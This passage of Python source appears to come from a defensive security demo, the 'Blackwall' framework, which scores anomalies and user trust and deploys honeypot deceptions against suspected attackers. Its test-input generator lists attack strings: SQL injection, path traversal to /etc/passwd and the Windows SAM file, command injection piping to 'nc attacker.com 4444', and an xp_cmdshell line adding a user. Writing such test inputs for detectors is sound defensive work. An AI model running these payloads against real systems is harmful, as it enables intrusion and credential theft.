            profile = self.attacker_profiles[attacker_id]
            if profile.get('deceptions_triggered', 0) > 0:
                # Previously deceived - likely to fall for it again
                base_score *= 1.2
        
        return min(1.0, base_score)
    
    def deploy_deception(self, threat_context: Dict) -> Dict:
        """Deploy sophisticated deception mechanism"""
        deception_id = f"deception_{int(time.time() * 1000)}"
        attacker_id = threat_context.get('source_ip', threat_context.get('user_id', 'unknown'))
        
        # Profile attacker
        attacker_profile = self._profile_attacker(threat_context)
        
        # Select deception type
        deception_type = self._select_deception_type(attacker_profile, threat_context)
        
        # Get honeypot configuration
        if deception_type in self.honeypots:
            target = self.honeypots[deception_type].copy()
        else:
            # Default to tar pit
            target = self.honeypots['tar_pit'].copy()
            deception_type = 'tar_pit'
        
        # Enhance deception based on context
        if deception_type == 'tar_pit':
            # Progressive delay based on attempts
            attempts = threat_context.get('repeated_attempts', 1)
            target['delay'] = min(30, 2 ** attempts)  # Exponential backoff
        
        deception = {
            "id": deception_id,
            "type": deception_type,
            "target": target,
            "start_time": time.time(),
            "attacker_id": attacker_id,
            "attacker_profile": attacker_profile,
            "context_summary": {  # Store only essential context info
                "resource": threat_context.get('resource', 'unknown'),
                "patterns": threat_context.get('patterns', []),
                "anomaly_score": threat_context.get('anomaly_score', 0)
            }
        }
        
        self.active_deceptions[deception_id] = deception
        
        # Update attacker profile
        if attacker_id not in self.attacker_profiles:
            self.attacker_profiles[attacker_id] = {
                'first_seen': time.time(),
                'deceptions_triggered': 0,
                'profile': attacker_profile
            }
        
        self.attacker_profiles[attacker_id]['deceptions_triggered'] += 1
        self.attacker_profiles[attacker_id]['last_deception'] = deception_type
        
        self.logger.warning(f"Deployed {deception_type} deception for {attacker_profile} "
                          f"attacker {attacker_id}, delay={target.get('delay', 'N/A')}s")
        
        return deception
    
    def process_threat_signal(self, rza_signal: SecuritySignal, tvm_signal: SecuritySignal) -> SecuritySignal:
        """Process combined signals with sophisticated deception decision"""
        start_time = time.time()
        
        # Extract comprehensive context
        context = {
            "anomaly_score": rza_signal.data.get("anomaly_score", 0),
            "trust_score": tvm_signal.data.get("trust_score", 1.0),
            "patterns": rza_signal.data.get("patterns", []),
            "user_id": tvm_signal.data.get("user_id", "unknown"),
            "resource": tvm_signal.data.get("resource", "unknown"),
            "repeated_attempts": self._count_recent_attempts(tvm_signal.data.get("user_id")),
            "unusual_timing": datetime.now().hour < 6 or datetime.now().hour > 22,
            "privilege_escalation_attempt": any(p in ["sql_injection", "command_injection"] 
                                              for p in rza_signal.data.get("patterns", [])),
            "reconnaissance_behavior": len(rza_signal.data.get("patterns", [])) > 2
        }
        
        # Calculate deception score
        deception_score = self.calculate_deception_score(context)
        
        # Dynamic threshold based on threat landscape
        threat_multiplier = 1.0
        if self.signal_bus.analytics.stats.get('burst_detected', False):
            threat_multiplier = 0.8  # Lower threshold during attack burst
        
        adjusted_threshold = self.deception_threshold * threat_multiplier
        should_deceive = deception_score > adjusted_threshold
        
        # Determine response
        if should_deceive:
            threat_level = ThreatLevel.HIGH
            deception = self.deploy_deception(context)
            context["deception"] = deception
            response = "DECEIVE"
        else:
            threat_level = ThreatLevel.MEDIUM
            response = "MONITOR"
        
        # Create signal
        signal = SecuritySignal(
            timestamp=time.time(),
            source_module="FPP",
            signal_type="deception_decision",
            data={
                "deception_score": deception_score,
                "threshold": adjusted_threshold,
                "should_deceive": should_deceive,
                "response": response,
                "context": context,
                "processing_time": time.time() - start_time
            },
            confidence=deception_score,
            threat_level=threat_level
        )
        
        self.signal_bus.publish(signal)
        
        # Log decision
        self.logger.info(f"FPP Decision: deception_score={deception_score:.3f}, "
                        f"threshold={adjusted_threshold:.3f}, response={response}, "
                        f"user={context['user_id']}, resource={context['resource']}")
        
        return signal
    
    def _count_recent_attempts(self, user_id: str) -> int:
        """Count recent attempts from a user"""
        if user_id not in self.attacker_profiles:
            return 1
        
        # Simple count - in production, track actual attempts
        return self.attacker_profiles[user_id].get('deceptions_triggered', 0) + 1
    
    def receive_signal(self, signal: SecuritySignal):
        """Process signals from other modules"""
        if signal.signal_type == "attack_detected":
            # Mark deception as successful
            attacker_id = signal.data.get("source_ip", signal.data.get("user_id"))
            self._mark_deception_success(attacker_id)
        elif signal.signal_type == "vulnerability_prediction":
            # Prepare deception based on predicted vulnerability
            patterns = signal.data.get("patterns", [])
            self.logger.info(f"Preparing deceptions for predicted patterns: {patterns}")

    def _mark_deception_success(self, attacker_id: str):
        """Mark deception as successful and update metrics"""
        success_count = 0
        
        for deception_id, deception in list(self.active_deceptions.items()):
            if deception["attacker_id"] == attacker_id:
                duration = time.time() - deception["start_time"]
                
                # Log successful deception
                self.logger.warning(f"Deception SUCCESS: {deception['type']} trapped "
                                  f"{attacker_id} for {duration:.2f}s")
                
                # Update success metrics
                success_count += 1
                
                # Publish success signal
                success_signal = SecuritySignal(
                    timestamp=time.time(),
                    source_module="FPP",
                    signal_type="deception_success",
                    data={
                        "deception_id": deception_id,
                        "deception_type": deception["type"],
                        "attacker_id": attacker_id,
                        "duration": duration
                    },
                    confidence=1.0,
                    threat_level=ThreatLevel.HIGH
                )
                self.signal_bus.publish(success_signal)
                
                # Remove active deception
                del self.active_deceptions[deception_id]
        
        if success_count > 0:
            # Update success rate
            self.deception_success_rate = min(1.0, self.deception_success_rate + 0.01)

class BlackwallFramework:
    """
    Enhanced Blackwall Framework with streaming analytics and comprehensive logging
    """
    
    def __init__(self):
        # Initialize streaming analytics first
        self.analytics = StreamingAnalytics(window_size=100)
        
        # Initialize components
        self.signal_bus = SecureSignalBus(self.analytics)
        self.rza = RZA(self.signal_bus)
        self.tvm = TVM(self.signal_bus)
        self.fpp = FPP(self.signal_bus)
        self.logger = logging.getLogger("Blackwall")
        
        # Framework statistics
        self.processed_requests = 0
        self.blocked_requests = 0
        self.deceived_attackers = 0
        self.false_positives = 0
        
        # Performance metrics
        self.response_times = deque(maxlen=100)
        
        # Log framework initialization
        self.logger.info("=" * 80)
        self.logger.info("BLACKWALL FRAMEWORK INITIALIZED")
        self.logger.info(f"Version: 2.0 Enhanced")
        self.logger.info(f"Modules: RZA (ML-Enhanced), TVM (Adaptive Trust), FPP (Strategic Deception)")
        self.logger.info(f"Analytics: Real-time Streaming Enabled")
        self.logger.info("=" * 80)
    
    def process_security_event(self, input_data: str, user_context: UserContext, resource: str) -> ResponseAction:
        """
        Enhanced main processing with comprehensive logging and analytics
        """
        start_time = time.time()
        self.processed_requests += 1
        
        # Log incoming request
        self.logger.info(f"\n{'='*60}")
        self.logger.info(f"SECURITY EVENT #{self.processed_requests}")
        self.logger.info(f"User: {user_context.user_id} @ {user_context.location}")
        self.logger.info(f"Resource: {resource}")
        self.logger.info(f"Input: {input_data[:100]}{'...' if len(input_data) > 100 else ''}")
        self.logger.info(f"{'='*60}")
        
        # Step 1: RZA vulnerability analysis
        self.logger.info("Step 1: RZA Analysis...")
        rza_signal = self.rza.process_input(input_data, {"resource": resource})
        
        # Step 2: TVM trust evaluation
        self.logger.info("Step 2: TVM Trust Evaluation...")
        tvm_signal = self.tvm.process_access_request(user_context, resource)
        
        # Step 3: Extract decision variables
        delta_t = rza_signal.data["anomaly_score"]
        mu_k_sigma = rza_signal.data["threshold"]
        trust_score = tvm_signal.data["trust_score"]
        tau = self.tvm.trust_threshold
        
        # Log decision variables
        self.logger.info(f"\nDECISION VARIABLES:")
        self.logger.info(f"  δ(t) = {delta_t:.3f} (anomaly score)")
        self.logger.info(f"  μ+kσ = {mu_k_sigma:.3f} (anomaly threshold)")
        self.logger.info(f"  T(u,c) = {trust_score:.3f} (trust score)")
        self.logger.info(f"  τ = {tau:.3f} (trust threshold)")
        
        # Step 4: Decision logic
        anomaly_detected = delta_t > mu_k_sigma
        trust_low = trust_score < tau
        
        self.logger.info(f"\nCONDITIONS:")
        self.logger.info(f"  Anomaly Detected: {anomaly_detected} (δ > μ+kσ)")
        self.logger.info(f"  Low Trust: {trust_low} (T < τ)")
        
        # Step 5: Determine response
        if anomaly_detected and trust_low:
            # High threat - engage FPP
            self.logger.info("\nStep 3: FPP Deception Evaluation...")
            fpp_signal = self.fpp.process_threat_signal(rza_signal, tvm_signal)
            f_x = fpp_signal.data["deception_score"]
            theta = self.fpp.deception_threshold
            
            self.logger.info(f"  F(x) = {f_x:.3f} (deception score)")
            self.logger.info(f"  θ = {theta:.3f} (deception threshold)")
            
            if f_x > theta:
                # Block and deceive
                self.blocked_requests += 1
                self.deceived_attackers += 1
                response = ResponseAction.BLOCK_AND_DECEIVE
                self.logger.critical(f"\nRESPONSE: {response.value.upper()}")
                self.logger.critical(f"HIGH THREAT DETECTED - Blocking and deploying deception")
            else:
                # Block only
                self.blocked_requests += 1
                response = ResponseAction.BLOCK
                self.logger.warning(f"\nRESPONSE: {response.value.upper()}")
                self.logger.warning(f"Anomaly with low trust - Blocking access")
                
        elif anomaly_detected and not trust_low:
            # Anomaly but trusted user
            response = ResponseAction.MONITOR
            self.logger.info(f"\nRESPONSE: {response.value.upper()}")
            self.logger.info(f"Anomaly detected but user is trusted - Monitoring")
            
        else:
            # Normal operation
            response = ResponseAction.ALLOW
            self.logger.info(f"\nRESPONSE: {response.value.upper()}")
            self.logger.info(f"Normal operation - Access allowed")
        
        # Track response time
        response_time = time.time() - start_time
        self.response_times.append(response_time)
        
        # Log performance
        self.logger.info(f"\nPERFORMANCE:")
        self.logger.info(f"  Response Time: {response_time:.3f}s")
        self.logger.info(f"  Avg Response Time: {np.mean(self.response_times):.3f}s")
        
        # Get streaming analytics recommendations
        recommendations = self.analytics.get_recommendations()
        if recommendations['recommendations']:
            self.logger.info(f"\nSTREAMING ANALYTICS:")
            for rec in recommendations['recommendations']:
                self.logger.info(f"  - {rec}")
        
        self.logger.info(f"\n{'='*60}\n")
        
        return response
    
    def get_statistics(self) -> Dict:
        """Get comprehensive framework statistics"""
        detection_rate = (self.blocked_requests / max(self.processed_requests, 1)) * 100
        deception_rate = (self.deceived_attackers / max(self.blocked_requests, 1)) * 100
        false_positive_rate = (self.false_positives / max(self.processed_requests, 1)) * 100
        
        stats = {
            "processed_requests": self.processed_requests,
            "blocked_requests": self.blocked_requests,
            "deceived_attackers": self.deceived_attackers,
            "false_positives": self.false_positives,
            "detection_rate": f"{detection_rate:.1f}%",
            "deception_effectiveness": f"{deception_rate:.1f}%",
            "false_positive_rate": f"{false_positive_rate:.1f}%",
            "avg_response_time": f"{np.mean(self.response_times) if self.response_times else 0:.3f}s",
            "streaming_analytics": self.analytics.stats
        }
        
        return stats
    
    def shutdown(self):
        """Gracefully shutdown the framework"""
        self.logger.info("Shutting down Blackwall Framework...")
        self.analytics.stop()
        
        # Final statistics
        stats = self.get_statistics()
        self.logger.info(f"\nFINAL STATISTICS:")
        for key, value in stats.items():
            if key != 'streaming_analytics':
                self.logger.info(f"  {key}: {value}")

# Keep the existing helper functions and main
def generate_random_user() -> UserContext:
    """Generate a random user context for testing"""
    user_types = [
        # Normal users
        {"id": "alice_researcher", "location": "office", "device": "managed_laptop_001", "behavior": 0.9, "attempts": 0},
        {"id": "bob_admin", "location": "home", "device": "managed_desktop_002", "behavior": 0.85, "attempts": 0},
        {"id": "carol_intern", "location": "office", "device": "reg_laptop_003", "behavior": 0.75, "attempts": 1},
        
        # Suspicious users
        {"id": "unknown_user", "location": "cafe", "device": "unknown_device", "behavior": 0.3, "attempts": 3},
        {"id": "external_contractor", "location": "airport", "device": "personal_phone", "behavior": 0.4, "attempts": 2},
        
        # High-risk users
        {"id": "suspicious_actor", "location": "foreign", "device": "tor_browser", "behavior": 0.1, "attempts": 5},
        {"id": "night_crawler", "location": "unknown", "device": "burner_device", "behavior": 0.2, "attempts": 4}
    ]
    
    # Select random user type and add variations
    base_user = random.choice(user_types)
    
    # Add random variations
    behavior_variation = random.uniform(-0.1, 0.1)
    attempts_variation = random.randint(0, 2)
    
    return UserContext(
        user_id=base_user["id"] + f"_{random.randint(100, 999)}",
        location=base_user["location"],
        device_id=base_user["device"] + f"_{random.randint(10, 99)}",
        behavioral_score=max(0.0, min(1.0, base_user["behavior"] + behavior_variation)),
        last_login=time.time() - random.randint(600, 86400),  # 10 min to 1 day ago
        failed_attempts=max(0, base_user["attempts"] + attempts_variation)
    )

def generate_random_attack() -> str:
    """Generate random attack patterns for testing"""
    attack_patterns = [
        # Normal operations
        "SELECT * FROM users WHERE id = 1",
        "UPDATE profile SET name = 'John' WHERE user_id = 123",
        "char buffer[256]; strcpy(buffer, safe_input);",
        
        # SQL Injection variants
        "SELECT * FROM users WHERE id = '1' OR '1'='1'",
        "SELECT * FROM admin WHERE password = '' OR 1=1--",
        "'; DROP TABLE users; --",
        "SELECT * FROM data WHERE id = 1 UNION SELECT password FROM admin",
        
        # Buffer overflow variants
        "strcpy(buffer, user_input); gets(data);",
        "char buf[10]; strcpy(buf, very_long_input);",
        "memcpy(dest, source, 9999);",
        
        # XSS variants
        "document.write('<script>alert(1)</script>');",
        "innerHTML = user_data;",
        
        # Path traversal
        "../../etc/passwd",
        "..\\..\\windows\\system32\\config\\sam",
        
        # Command injection
        "; cat /etc/passwd",
        "&& whoami",
        "| nc attacker.com 4444",
        
        # Advanced attacks
        "SELECT * FROM users WHERE id = 1; EXEC xp_cmdshell('net user hack hack /add');",
        "strcat(buffer, user_controlled_data); system(buffer);"
    ]
    
    base_attack = random.choice(attack_patterns)
    
    # Add random noise to make each attack slightly different
    noise_chars = ['_', ' ', '\t', '\n']
    if random.random() < 0.3:  # 30% chance to add noise
        base_attack += random.choice(noise_chars) + str(random.randint(1, 999))
    
    return base_attack

def main():
    """Enhanced demonstration of Blackwall Framework with comprehensive logging"""
    print("=" * 80)
    print("BLACKWALL CYBERSECURITY FRAMEWORK - ENHANCED DEMO")
    print("Version 2.0 with Real-time Streaming Analytics")
    print("=" * 80)
    print()
    
    # Initialize framework
    blackwall = BlackwallFramework()
    
    try:
        # Generate random scenarios
        num_scenarios = random.randint(8, 15)
        print(f"Running {num_scenarios} randomized scenarios...\n")
        
        # Mix of normal and attack scenarios
        for i in range(num_scenarios):
            print(f"\n{'='*60}")
            print(f"SCENARIO {i+1}/{num_scenarios}")
            print(f"{'='*60}")
            
            # Generate random user and input
            user = generate_random_user()
            
            # 70% chance of attack, 30% normal operation
            if random.random() < 0.7:
                attack_input = generate_random_attack()
                scenario_type = "ATTACK"
            else:
                attack_input = "SELECT * FROM products WHERE category = 'electronics'"
                scenario_type = "NORMAL"
            
            resource = random.choice(["database", "system", "web_app", "file_server", "admin_panel"])
            
            print(f"Type: {scenario_type}")
            print(f"User: {user.user_id} @ {user.location}")
            print(f"Device: {user.device_id}")
            print(f"Resource: {resource}")
            print(f"Input: {attack_input[:80]}{'...' if len(attack_input) > 80 else ''}")
            print("-" * 60)
            
            # Process event
            response = blackwall.process_security_event(attack_input, user, resource)
            
            print(f"\nFINAL DECISION: {response.value.upper()}")
            
            # Random delay between scenarios
            delay = random.uniform(0.5, 2.0)
            print(f"\nWaiting {delay:.1f}s before next scenario...")
            time.sleep(delay)
        
        # Display final statistics
        print(f"\n{'='*80}")
        print("FRAMEWORK STATISTICS")
        print(f"{'='*80}")
        stats = blackwall.get_statistics()
        
        print("\nCore Metrics:")
        print(f"  Total Requests: {stats['processed_requests']}")
        print(f"  Blocked Requests: {stats['blocked_requests']}")
        print(f"  Deception Deployments: {stats['deceived_attackers']}")
        print(f"  Detection Rate: {stats['detection_rate']}")
        print(f"  Deception Effectiveness: {stats['deception_effectiveness']}")
        print(f"  Average Response Time: {stats['avg_response_time']}")
        
        print("\nStreaming Analytics:")
        streaming_stats = stats['streaming_analytics']
        print(f"  Average Threat Level: {streaming_stats['avg_threat_level']:.2f}")
        print(f"  Anomaly Trend: {streaming_stats['anomaly_trend']:+.3f}")
        print(f"  Trust Trend: {streaming_stats['trust_trend']:+.3f}")
        print(f"  Pattern Entropy: {streaming_stats['pattern_entropy']:.2f}")
        print(f"  Burst Detected: {streaming_stats['burst_detected']}")
        
        print(f"\nEnhanced Features Demonstrated:")
        print(f"  ✓ Real-time streaming analytics with trend detection")
        print(f"  ✓ ML-enhanced pattern recognition in RZA")
        print(f"  ✓ Adaptive trust scoring with context awareness")
        print(f"  ✓ Strategic deception with attacker profiling")
        print(f"  ✓ Comprehensive logging to files and console")
        print(f"  ✓ Performance monitoring and optimization")
        
        print(f"\nLog Files Created:")
        log_files = list(Path("blackwall_logs").glob("*.log"))
        for log_file in log_files[:5]:  # Show first 5 log files
            print(f"  - {log_file.name}")
        if len(log_files) > 5:
            print(f"  ... and {len(log_files) - 5} more")
        
    except KeyboardInterrupt:
        print("\n\nInterrupted by user")
    finally:
        # Cleanup
        blackwall.shutdown()
        print("\nDemo completed. Check 'blackwall_logs' directory for detailed logs.")

if __name__ == "__main__":
    main()
